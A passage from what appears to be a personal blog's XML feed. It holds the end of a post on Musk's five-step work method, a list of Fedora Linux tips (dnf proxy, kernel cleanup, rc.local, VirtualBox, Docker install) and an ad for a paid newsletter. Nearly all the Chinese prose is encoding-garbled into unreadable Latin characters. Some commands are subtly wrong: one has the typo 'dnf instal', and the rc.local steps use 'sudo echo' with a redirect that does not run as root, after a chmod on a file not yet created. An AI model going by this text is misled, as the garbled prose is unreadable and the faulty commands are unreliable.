ä¸‹å±çš„ä¸‹å±äº¤æµï¼Œä¸è¦åªå’Œä½ ç›´æ¥ç®¡ç†çš„ç›¸å…³è´Ÿè´£äººèŠ</li><li>æ‹›è˜å·¥ä½œæ€åº¦ç«¯æ­£çš„äººï¼ŒæŠ€èƒ½å¯ä»¥æ•™ï¼Œä½†æ˜¯å·¥ä½œæ€åº¦è¦æ”¹å˜å¾ˆå›°éš¾</li><li>ä½ å¥½ï¼Œæˆ‘å¥½ï¼Œå¤§å®¶å¥½ï¼Œæ˜¯å¾ˆå±é™©çš„ï¼Œäººä»¬ä»æ­¤ä¸ä¼šè´¨ç–‘åŒäº‹çš„å·¥ä½œæˆæœ</li><li>æ°¸è¿œä¸è¦è¦æ±‚å›¢é˜Ÿåšä½ è‡ªå·±éƒ½ä¸æ„¿æ„åšçš„äº‹</li><li>ç–¯ç‹‚çš„ç´§è¿«æ„Ÿæ˜¯æˆ‘ä»¬å…¬å¸è¿ä½œçš„æ³•åˆ™</li></ul><h2 id="æˆ‘çš„è®¨è®º"><a href="#æˆ‘çš„è®¨è®º" class="headerlink" title="æˆ‘çš„è®¨è®º"></a>æˆ‘çš„è®¨è®º</h2><p>ä¸Šé¢çš„äº”ä¸ªæ­¥éª¤ï¼Œå¯ä»¥åˆ†åˆ«ç”¨ä¸€ä¸ªå•è¯æ¥è¡¨ç¤ºï¼Œåˆ†åˆ«ä¸º:</p><ol><li>Question&#x2F;æé—®</li><li>Delete&#x2F;åˆ é™¤</li><li>Optimize&#x2F;ä¼˜åŒ–</li><li>Accelerate&#x2F;åŠ é€Ÿ</li><li>Automate&#x2F;è‡ªåŠ¨åŒ–</li></ol><p>é©¬æ–¯å…‹åœ¨æ¥å—é‡‡è®¿æ—¶ï¼Œä¸€åŠçš„æ—¶é—´ç”¨åœ¨è§£é‡Šå‰ 2 ä¸ªæ­¥éª¤ï¼Œå¯è§è¿™ä¸¤ä¸ªæ­¥éª¤åœ¨ä»–å¿ƒç›®ä¸­æ˜¯æœ€é‡è¦çš„ã€‚</p><p>ä»–è¯´æˆ‘ä»¬æœ€ç»å¸¸çŠ¯çš„é”™è¯¯æ˜¯ã€Œå°è¯•å»ä¼˜åŒ–ä¸€ä¸ªæœ¬æ¥ä¸åº”è¯¥å­˜åœ¨çš„äº‹æƒ…ã€</p><blockquote><p>Optimize a thing that should not exist.</p></blockquote><p>é©¬æ–¯å…‹è®¤ä¸ºï¼Œæˆ‘ä»¬æœ‰è¿™ç§åƒµåŒ–æ€ç»´çš„åŸå› æ˜¯ï¼Œä¸Šå­¦æœŸé—´é•¿æ—¶é—´å…»æˆçš„ã€Œè§£é¢˜æ€ç»´ã€ï¼Œå¦‚æœä½ åœ¨ä¸Šå¤§å­¦çš„æ—¶å€™è´¨ç–‘æ•™æˆçš„é—®é¢˜å¾ˆæ„šæ†ƒï¼Œé‚£ä¹ˆä½ å°†ä¼šæŒ‚ç§‘ ğŸ¤£</p><blockquote><p>You got to answer the question.</p></blockquote><p>ç¬¬ 1 ä¸ªæ­¥éª¤ã€Œæé—®ã€ï¼Œæ˜¯ä¸ºäº†å…‹æœäººä»¬çš„åƒµåŒ–æ€ç»´è€Œè®¾ç½®çš„ï¼Œå°¤å…¶æ˜¯å½“é—®é¢˜æ˜¯æƒå¨äººå£«æå‡ºæ—¶æ›´è¦æé«˜è­¦æƒ•ï¼Œéœ€è¦å…‹æœå´‡æ‹œæƒå¨çš„å¿ƒç†å› ç´ ã€‚</p><p>ç¬¬ 2 ä¸ªæ­¥éª¤ã€Œåˆ é™¤ã€ï¼Œæ˜¯å› ä¸ºå¾ˆå¤šéƒ¨ä»¶æˆ–æµç¨‹çš„å­˜åœ¨åªæ˜¯ä¸ºäº†é¢„é˜²ä¸‡ä¸€ï¼Œä½ ä¸ºäº†é¢„é˜²ä¸‡ä¸€ï¼Œä»˜å‡ºäº†ã€Œå¤æ‚ã€çš„ä»£ä»·ã€‚</p><p>ç¬¬ 3 ä¸ªæ­¥éª¤æ‰æ˜¯ã€Œä¼˜åŒ–ã€ï¼Œç„¶è€Œå¯¹å¤šæ•°äººæ¥è¯´ä¼˜åŒ–æ˜¯ç¬¬ä¸€ä¸ªæ­¥éª¤ â€¦</p><p>äº”æ­¥å·¥ä½œæ³•çš„é‡è¦æ¨è®ºï¼Œå¾ˆå°‘è§äººè®¨è®ºã€‚å…¶å®è¿™äº›å»ºè®®æ›´åŠ å…·ä½“ï¼Œå¯¹äºä»äº‹ç®¡ç†çš„äººæ¥è¯´ï¼Œè¿™äº›å»ºè®®é¢‡å…·å‚è€ƒä»·å€¼ã€‚</p><p>æ¯”å¦‚ï¼Œè½¯ä»¶å›¢é˜Ÿçš„ç®¡ç†äººå‘˜è‡³å°‘èŠ± 20% çš„æ—¶é—´ç¼–ç¨‹ã€‚</p><p>å›½å†…å…¬å¸è½¯ä»¶å›¢é˜Ÿçš„ç®¡ç†äººå‘˜åŸºæœ¬ä¸å†™ä»£ç ï¼Œå¼€ä¼šæ˜¯ä¸»è¦ä»»åŠ¡ã€‚æˆ‘æ¯”è¾ƒæ¬£èµä¸€ä¸ªæŠ€æœ¯ç®¡ç†äººå‘˜çš„è¯´æ³•ï¼šã€Œä½œä¸ºä¸€ä¸ªæŠ€æœ¯ç®¡ç†ï¼Œä½ åº”è¯¥èƒ½èƒœä»»å¾€ä¸‹ä¸‰çº§çš„å·¥ä½œã€</p><p>æœ¬æ–‡æ¥è‡ª ã€Œæ›¼ç¦å‰çš„åˆ†äº«ã€<a href="https://xiaobot.net/p/MindForge">https://xiaobot.net/p/MindForge</a> å°æŠ¥ç«¥ä¸“æ  </p><p>è¯¦æƒ…è¯·è¯¦è§ï¼š<a href="https://www.usmacd.com/cn/share_knowledge/">ä»˜è´¹ä¸“æ ï¼šã€Šæ›¼ç¦å‰çš„åˆ†äº«ã€‹</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora ä½¿ç”¨æ—¥å¸¸å°è®°</title>
    <link href="/cn/Fedora_usage/"/>
    <url>/cn/Fedora_usage/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€ä»½å¾ˆä¹…è¿œçš„ç¬”è®°ï¼Œè´¨é‡ä¹Ÿä¸é«˜ï¼Œä»¥æˆ‘ç°åœ¨çš„æ ‡å‡†çœ‹æ˜¯ä¸åˆæ ¼çš„ç¬”è®°ã€‚</p><p>ä½†æˆ‘è§‰å¾—æœ‰äº›ä¿¡æ¯å¯¹å¤§å®¶å¯èƒ½è¿˜æ˜¯èƒ½æœ‰ä¸€äº›å¸®åŠ©ï¼Œä¸å®Œå–„çš„åœ°æ–¹ï¼Œéœ€è¦è‡ªè¡Œä¸Šç½‘æœç´¢ï¼Œè§è°…ï¼</p><h2 id="â˜†-å¦‚ä½•åˆ‡æ¢é»˜è®¤çš„æ¡Œé¢ç®¡ç†å™¨"><a href="#â˜†-å¦‚ä½•åˆ‡æ¢é»˜è®¤çš„æ¡Œé¢ç®¡ç†å™¨" class="headerlink" title="â˜† å¦‚ä½•åˆ‡æ¢é»˜è®¤çš„æ¡Œé¢ç®¡ç†å™¨"></a>â˜† å¦‚ä½•åˆ‡æ¢é»˜è®¤çš„æ¡Œé¢ç®¡ç†å™¨</h2><p>Fedora 16 åä½¿ç”¨æ–°çš„æ–¹æ³•æ¥åˆ‡æ¢é»˜è®¤çš„æ¡Œé¢ç®¡ç†å™¨ã€‚</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo <span class="hljs-params">system</span>ctl enable --<span class="hljs-literal">force</span> lightdm.service<br></code></pre></td></tr></table></figure><p>åœ¨ä»¥å‰çš„ç‰ˆæœ¬éœ€è¦ä½¿ç”¨ &#x2F;etc&#x2F;sysconfig&#x2F;desktop æ–‡ä»¶æ¥åˆ‡æ¢ã€‚</p><p>å‚è€ƒé“¾æ¥ : <a href="https://docs.fedoraproject.org/en-US/Fedora/18/html/Release_Notes/sect-Release_Notes-Changes_for_Desktop.html">https://docs.fedoraproject.org/en-US/Fedora/18/html/Release_Notes/sect-Release_Notes-Changes_for_Desktop.html</a></p><h2 id="â˜†-å¦‚ä½•ä¸º-dnf-è®¾ç½®ä»£ç†"><a href="#â˜†-å¦‚ä½•ä¸º-dnf-è®¾ç½®ä»£ç†" class="headerlink" title="â˜† å¦‚ä½•ä¸º dnf è®¾ç½®ä»£ç†"></a>â˜† å¦‚ä½•ä¸º dnf è®¾ç½®ä»£ç†</h2><p>æ–¹æ³•1: ä½¿ç”¨ç¯å¢ƒå˜é‡è®¾ç½® socks5 ä»£ç </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo http_proxy=socks5h://localhost:9999 dnf update<br></code></pre></td></tr></table></figure><p>æ–¹æ³•2: ä¿®æ”¹æ–‡ä»¶è®¾ç½® socks5 ä»£ç </p><p>ç¼–è¾‘ <code>/etc/dnf/dnf.conf</code> æ·»åŠ ä¸‹é¢å‡ è¡Œ</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[main]</span><br><span class="hljs-attr">proxy</span>=socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9999</span><br><span class="hljs-comment">#proxy=http://proxy.tylersguides.com:3128</span><br><span class="hljs-comment">#proxy_username=dnf</span><br><span class="hljs-comment">#proxy_password=password</span><br><span class="hljs-comment">#proxy_auth_method=basic</span><br></code></pre></td></tr></table></figure><h2 id="â˜†-dnf-è®¾ç½®-fastmirror-ç­‰æ’ä»¶"><a href="#â˜†-dnf-è®¾ç½®-fastmirror-ç­‰æ’ä»¶" class="headerlink" title="â˜† dnf è®¾ç½® fastmirror ç­‰æ’ä»¶"></a>â˜† dnf è®¾ç½® fastmirror ç­‰æ’ä»¶</h2><p>åœ¨ dnf çš„é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;dnf&#x2F;dnf.conf æ·»åŠ ä¸‹é¢ä¸¤è¡Œ:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">fastestmirror</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">deltarpm</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="â˜†-Fedora-å¦‚ä½•å®‰å…¨åˆ é™¤è€å†…æ ¸"><a href="#â˜†-Fedora-å¦‚ä½•å®‰å…¨åˆ é™¤è€å†…æ ¸" class="headerlink" title="â˜† Fedora å¦‚ä½•å®‰å…¨åˆ é™¤è€å†…æ ¸"></a>â˜† Fedora å¦‚ä½•å®‰å…¨åˆ é™¤è€å†…æ ¸</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo dnf remove --oldinstallonly --<span class="hljs-built_in">setopt</span> installonly_limit=2 kernel<br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³åˆ é™¤æŸä¸ªç‰ˆæœ¬çš„å†…æ ¸</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">ls</span> -l /boot/vmlinuz*<br>sudo dnf remove <span class="hljs-string">&#x27;kernel*4.19.2-300*&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="â˜†-Fedora-ä¸­æ–‡ä¹±ç "><a href="#â˜†-Fedora-ä¸­æ–‡ä¹±ç " class="headerlink" title="â˜† Fedora ä¸­æ–‡ä¹±ç "></a>â˜† Fedora ä¸­æ–‡ä¹±ç </h2><p>å‡çº§Fedora 28 å‘ç°ç»ˆç«¯ä¹±ç ï¼Œç»è¿‡ä¸€ç¿»æ’æŸ¥åå‘ç°æ˜¯è¯­è¨€æ”¯æŒå‡çº§çš„æ—¶å€™ä¸çŸ¥é“æ€ä¹ˆ  è¢«å¸è½½äº†ã€‚</p><p>æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š<br><code>sudo dnf install langpacks-zh_CN</code></p><h2 id="â˜†-å‡çº§-Fedora-æŠ¥é”™-100"><a href="#â˜†-å‡çº§-Fedora-æŠ¥é”™-100" class="headerlink" title="â˜† å‡çº§ Fedora æŠ¥é”™  /   100%"></a>â˜† å‡çº§ Fedora æŠ¥é”™  <code>/</code>   100%</h2><p>å‡çº§ fedora 29 çš„æ—¶å€™é‡åˆ°ï¼Œç»è¿‡ä¸€ç•ªç ”ç©¶å‘ç°æ˜¯ dnf çš„è®¾ç½®é—®é¢˜ã€‚</p><p>cat &#x2F;etc&#x2F;dnf&#x2F;dnf.conf </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[main]</span><br><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">installonly_limit</span>=<span class="hljs-number">5</span><br><span class="hljs-attr">clean_requirements_on_remove</span>=<span class="hljs-literal">True</span><br><span class="hljs-attr">keepcache</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">fastestmirror</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">deltarpm</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>keepcache &#x3D; 1 ä¿ç•™æ›´æ–°çš„rpm åŒ…ï¼Œæµªè´¹å¤§é‡ç©ºé—´ã€‚ ä½¿ç”¨Â <code>dnf clean packages</code>  å¯ä»¥åˆ é™¤å¤šä½™çš„å·¥å…·åŒ…ã€‚</p><p>æ³¨æ„æŸ¥çœ‹ &#x2F;usr&#x2F;local ä¸‹æœ‰æ— ä½“ç§¯å·¨å¤§çš„è½¯ä»¶åŒ…ï¼Œå¯ä»¥åˆ é™¤ã€‚ ä¸€äº› Linux ç³»ç»Ÿè®¾ç½®ä¿å­˜ç¨‹åºå´©æºƒçš„ core æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å¯èƒ½éå¸¸å¤§ï¼Œéœ€è¦æ³¨æ„ã€‚</p><h2 id="â˜†-Fedora-å¼€å¯-rc-local"><a href="#â˜†-Fedora-å¼€å¯-rc-local" class="headerlink" title="â˜† Fedora å¼€å¯ rc.local"></a>â˜† Fedora å¼€å¯ rc.local</h2><p>fedora é»˜è®¤æ²¡æœ‰å¼€å¯ rc.local.service, ä¹Ÿæ²¡æœ‰åˆ›å»º &#x2F;etc&#x2F;rc.local æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å¯ç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> rc-local.service<br><span class="hljs-built_in">chmod</span> a+x /etc/rc.local<br><br>sudo <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#! /bin/bash&#x27;</span> &gt; /etc/rc.local<br>sudo <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exit 0&#x27;</span> &gt;&gt; /etc/rc.local<br></code></pre></td></tr></table></figure><h2 id="â˜†-Fedora-XFCE-thunar-æ— æ³•å³é”®è§£å‹"><a href="#â˜†-Fedora-XFCE-thunar-æ— æ³•å³é”®è§£å‹" class="headerlink" title="â˜† Fedora XFCE thunar æ— æ³•å³é”®è§£å‹"></a>â˜† Fedora XFCE thunar æ— æ³•å³é”®è§£å‹</h2><p>éœ€è¦å®‰è£…ä¸¤ä¸ªç¨‹åº</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo dnf instal xarchiver<br>sudo dnf install thunar-archive-plugin<br></code></pre></td></tr></table></figure><h2 id="â˜†-Fedora-å¦‚ä½•å¼€å¯-XFCE-çš„å£°éŸ³"><a href="#â˜†-Fedora-å¦‚ä½•å¼€å¯-XFCE-çš„å£°éŸ³" class="headerlink" title="â˜† Fedora å¦‚ä½•å¼€å¯ XFCE çš„å£°éŸ³"></a>â˜† Fedora å¦‚ä½•å¼€å¯ XFCE çš„å£°éŸ³</h2><p>fedora xfce é»˜è®¤æ²¡æœ‰å®‰è£…å£°éŸ³å¥—ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo yum -y install xfce4-volumed<br></code></pre></td></tr></table></figure><p>éœ€è¦å°†å½“å‰ç”¨æˆ·åŠ å…¥audioç»„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo usermod -aG audio user<br></code></pre></td></tr></table></figure><h2 id="â˜†-å‡çº§å†…æ ¸åï¼ŒVirtualbox-ä¸èƒ½æ­£å¸¸å¯åŠ¨"><a href="#â˜†-å‡çº§å†…æ ¸åï¼ŒVirtualbox-ä¸èƒ½æ­£å¸¸å¯åŠ¨" class="headerlink" title="â˜†  å‡çº§å†…æ ¸åï¼ŒVirtualbox ä¸èƒ½æ­£å¸¸å¯åŠ¨"></a>â˜†  å‡çº§å†…æ ¸åï¼ŒVirtualbox ä¸èƒ½æ­£å¸¸å¯åŠ¨</h2><p>éœ€è¦é‡æ–°å®‰è£…virutalboxçš„å†…æ ¸æ¨¡å—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo yum search kmod-VirtualBox <br>sudo systemctl restart systemd-modules-load.service<br></code></pre></td></tr></table></figure><h2 id="â˜†-å‡çº§ç³»ç»Ÿå-Virtualbox-æ— æ³•å¯åŠ¨è™šæ‹Ÿæœº"><a href="#â˜†-å‡çº§ç³»ç»Ÿå-Virtualbox-æ— æ³•å¯åŠ¨è™šæ‹Ÿæœº" class="headerlink" title="â˜† å‡çº§ç³»ç»Ÿå, Virtualbox æ— æ³•å¯åŠ¨è™šæ‹Ÿæœº"></a>â˜† å‡çº§ç³»ç»Ÿå, Virtualbox æ— æ³•å¯åŠ¨è™šæ‹Ÿæœº</h2><p>åŸå› æ˜¯ vbox çš„å†…æ ¸æ¨¡å—æ²¡æœ‰åŠ è½½ä¸Šï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /usr/sbin/akmods --force<br>sudo systemctl restart systemd-modules-load.service<br></code></pre></td></tr></table></figure><h2 id="â˜†-Fedora-å¦‚ä½•å‡çº§æœ€æ–°çš„-Docker"><a href="#â˜†-Fedora-å¦‚ä½•å‡çº§æœ€æ–°çš„-Docker" class="headerlink" title="â˜† Fedora å¦‚ä½•å‡çº§æœ€æ–°çš„ Docker"></a>â˜† Fedora å¦‚ä½•å‡çº§æœ€æ–°çš„ Docker</h2><p>1ï¼‰ç§»é™¤è€çš„ Docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf remove docker \<br>                 docker-client \<br>                 docker-client-latest \<br>                 docker-common \<br>                 docker-latest \<br>                 docker-latest-logrotate \<br>                 docker-logrotate \<br>                 docker-selinux \<br>                 docker-engine-selinux \<br>                 docker-engine<br></code></pre></td></tr></table></figure><ol start="2"><li>å®‰è£… Docker ä»“åº“</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf -y install dnf-plugins-core<br>sudo dnf config-manager --add-repo https://download.docker.com/linux/fedora/docker-ce.repo<br></code></pre></td></tr></table></figure><ol start="3"><li>å®‰è£… Docker å¼•æ“</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ GPG key æ˜¯å¦ä¸º <code>060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35</code>, æ˜¯çš„è¯ï¼Œaccept it</p><ol start="4"><li>é‡å¯ Docker æœåŠ¡</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl start docker<br></code></pre></td></tr></table></figure><p><a href="https://docs.docker.com/engine/install/fedora/#set-up-the-repository">https://docs.docker.com/engine/install/fedora/#set-up-the-repository</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»˜è´¹ä¸“æ ï¼šã€Šæ›¼ç¦å‰çš„åˆ†äº«ã€‹</title>
    <link href="/cn/share_knowledge/"/>
    <url>/cn/share_knowledge/</url>
    
    <content type="html"><![CDATA[<p>2024 å¹´ï¼Œæˆ‘å°è¯•å°æŠ¥ç«¥ã€Šæ›¼ç¦å‰çš„åˆ†äº«ã€‹ä¸“æ å†™ä½œï¼Œåˆ†äº«å¹³æ—¥çš„ è¯»ä¹¦ç¬”è®°ã€å¿ƒå¾—ä½“ä¼šã€ç»å†ç»éªŒã€‚</p><p>ä¸»è¦å…³æ³¨ï¼šé‡‘èæŠ•èµ„ï¼ŒçŸ¥è¯†ç®¡ç†ï¼Œäº§å“å¼€å‘ï¼Œç”Ÿäº§æ•ˆç‡ï¼Œå’Œä¸ªäººæˆé•¿ã€‚å› ä¸ºä¸æ˜¯å…¬å¼€åˆ†äº«ï¼Œä¿¡æ¯é‡æ¯”æ¨ä¸Šå…¬å¼€åˆ†äº«è¦å¤§ã€‚</p><p>å°æŠ¥ç«¥çš„ newsletter åŠŸèƒ½å¯ä»¥ç›´æ¥å°†å†…å®¹å‘åˆ°æ‚¨çš„é‚®ç®±ï¼Œæ–¹ä¾¿æ‚¨æ—¥åå¸¸çœ‹ã€‚</p><p>å¦‚æœæ‚¨è§‰å¾—æˆ‘åˆ†äº«çš„å†…å®¹å¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ä»¥è®¢é˜…ä¸“æ çš„å½¢å¼æ”¯æŒæˆ‘ã€‚è¿™æ ·ï¼Œæ‚¨åœ¨æ‰“èµçš„åŒæ—¶ï¼Œè¿˜èƒ½æ”¶è·é«˜ä»·å€¼ä¸“æ å†…å®¹ã€‚</p><p>å®šä»·ï¼š 30 å…ƒ 3 ä¸ªæœˆï¼Œè¯·æˆ‘å–ä¸€æ¯å’–å•¡ â˜•ï¸   :)  æ„Ÿè°¢ ğŸ™ğŸ»</p><p>ä¸“æ åœ°å€: <a href="https://xiaobot.net/p/MindForge">æ›¼ç¦å‰çš„åˆ†äº«</a> , ç›®å‰å·²åŒ…å«çš„å†…å®¹ï¼š</p><ul><li><a href="https://xiaobot.net/post/5d5b4403-1ab9-4dfa-ab83-7a43e1d1208c">@25 å‡ ç§’é’Ÿå†…æ•´ç†æ•°å­—ç”Ÿæ´»çš„ç³»ç»Ÿ</a></li><li><a href="https://xiaobot.net/post/b43df2f0-884d-4259-84dd-5f842db2610a">@24 å¸‚åœºå¦‚ä½•è¿åŠ¨</a></li><li><a href="https://xiaobot.net/post/cc326212-bcc4-4267-86be-8ca847ee0221">@23 æˆ˜ç•¥æ€§ä¼‘æ¯çš„æ–¹æ³•</a></li><li><a href="https://xiaobot.net/post/0a98373b-a12c-46f8-a940-16e4e1f19315">@22 å¦‚ä½•è·å–ä¼˜è´¨çš„ä¿¡æ¯</a></li><li><a href="https://xiaobot.net/post/98b049b4-5d03-47f6-a5b0-b36a10fab14d">@21 J æ›²çº¿ - å…ˆä¸‹é™åä¸Šå‡</a></li><li><a href="https://xiaobot.net/post/7b0c77e9-c245-4402-b773-f450ecef915c">@20 ä¸‡ç»´é’¢çš„å¼ºåŠ›ç ”è¯»ç¬”è®°æ³•</a></li><li><a href="https://xiaobot.net/post/4f91d3d8-836c-4b52-8922-4aa30daea47f">@19 å¦‚æœè¯­è¨€å­¦ä¹ åªèƒ½åšä¸€ä»¶äº‹</a></li><li><a href="https://xiaobot.net/post/72e49065-30a8-46ff-9aae-0a73b9824385">@18 æå‡åˆ›é€ åŠ›çš„éº¦å‰å¼—æ–¹æ³•</a></li><li><a href="https://xiaobot.net/post/0c0b0492-bd2d-4c64-9ebe-b0b34e105055">@17 é‡‘èæŠ•èµ„ä¸­çš„é¢„æœŸæ€ç»´</a></li><li><a href="https://xiaobot.net/post/541abc4f-f6a3-4843-ae9d-f2cde0f046c5">@16 é©¬æ–¯å…‹çš„å“²å­¦</a></li><li><a href="https://xiaobot.net/post/86bb243c-5143-4947-ab5a-bacc9e54b29e">@15 æ—å½ªçš„é˜…è¯»ä¹ æƒ¯</a></li><li><a href="https://xiaobot.net/post/a60d6d1b-deb1-4782-bd46-d3f9ca622e21">@14 å®šæœŸå›é¡¾ç¬”è®°çš„å¥½å¤„</a></li><li><a href="https://xiaobot.net/post/8787e7ff-5605-454a-84a9-282fb70a2181">@13 å¯ç†è§£è¾“å…¥è‹±è¯­å­¦ä¹ æ³•çš„è¡¥å……</a></li><li><a href="https://xiaobot.net/post/860775b0-39db-4144-b3d2-ccbdb5bb75a5">@12 å¯ç†è§£è¾“å…¥è‹±è¯­å­¦ä¹ æ–¹æ³•</a></li><li><a href="https://xiaobot.net/post/766e30d8-ff07-4211-a43c-6b1a3dbe5b1e">@11 æˆåŠŸæ˜¯æˆåŠŸä¹‹æ¯</a></li><li><a href="https://xiaobot.net/post/dbcc22a0-db08-4b4d-8bf3-06bef4a6ab4b">@10 è‰¯å¥½çš„ç¡çœ éƒ½æœ‰å“ªäº›ä½œç”¨</a></li><li><a href="https://xiaobot.net/post/4b10b829-d3e5-4e9f-b8fb-5e6189cf3740">@9  å¦‚ä½•æå‡è‡ªå·±çš„ç¨€ç¼ºæ€§</a></li><li><a href="https://xiaobot.net/post/94ca63c3-626e-4dee-a9c2-239a184bcdf4">@8  å¦‚ä½•æ‹¥æœ‰æºæºä¸æ–­çš„è¡ŒåŠ¨åŠ›ï¼Ÿ</a></li><li><a href="https://xiaobot.net/post/736b562a-c1f4-41f9-b84c-64a0aeebadce">@7  åè„†å¼±å¼çš„å­¦ä¹ æ–¹æ³•</a></li><li><a href="https://xiaobot.net/post/fcd124fc-8c41-49ec-a6a8-f0c33f61a197">@6  ä¸¤ç§æœ‰æ•ˆçš„å­¦ä¹ æ¨¡å‹</a></li><li><a href="https://xiaobot.net/post/0e59685c-b7c4-465a-b7e4-c84fcedd15db">@5  æˆé•¿ä¸­çš„ä¸ƒæ¡åŸåˆ™</a></li><li><a href="https://xiaobot.net/post/7d03f5d5-78f8-48bb-b676-5583051b6b5c">@4  æ–¯å¤šè‘›å“²å­¦çš„æ§åˆ¶äºŒåˆ†æ³•</a></li><li><a href="https://xiaobot.net/post/168864d5-221d-4600-91bc-377b8ffc8dd8">@3  å¦‚ä½•è®²å¥½ä¸€ä¸ªæ•…äº‹</a></li><li><a href="https://xiaobot.net/post/b53fd18b-0768-4dfd-b351-e8c12bf945b1">@2  åŸåˆ™çš„åŠ›é‡</a></li><li><a href="https://xiaobot.net/post/15be83c4-37b6-47f8-930c-1d557e783363">@1  è‹¥å¹²åŸºæœ¬åŸåˆ™å’Œå¸‚åœºç®´è¨€</a></li></ul><div class="note note-secondary">            <p>æœ¬åšå®¢å†…å®¹æ°¸ä¹…å…è´¹ï¼Œå¦‚æœåšå®¢çš„æ–‡ç« å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©ï¼Œæ¬¢è¿ä»¥è®¢é˜…ä¸“æ çš„æ–¹å¼æ”¯æŒæˆ‘ã€‚æ‚¨çš„æ”¯æŒæ˜¯æˆ‘åšæŒå†™ä½œçš„æå¤§åŠ¨åŠ›ï¼å†æ¬¡æ„Ÿè°¢!</p>          </div><p>TL;DR:</p><h2 id="ä¸“æ çš„åå­—"><a href="#ä¸“æ çš„åå­—" class="headerlink" title="ä¸“æ çš„åå­—"></a>ä¸“æ çš„åå­—</h2><p>ä¸“æ åå­— - æ›¼ç¦å‰çš„åˆ†äº«ï¼Œè¯´æ˜äº†ä¸“æ çš„ç›®çš„ï¼Œä¸»è¦æ˜¯åˆ†äº«æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p><p>æ›¼ç¦å‰æ˜¯ MindForge id çš„ä¸­æ–‡è°éŸ³ï¼ŒMindForge å¯ä»¥æ‹†åˆ†ä¸ºä¸¤ä¸ªå•è¯ Mind å’Œ Forgeï¼Œæ˜¯æ€ç»´é”»é€ 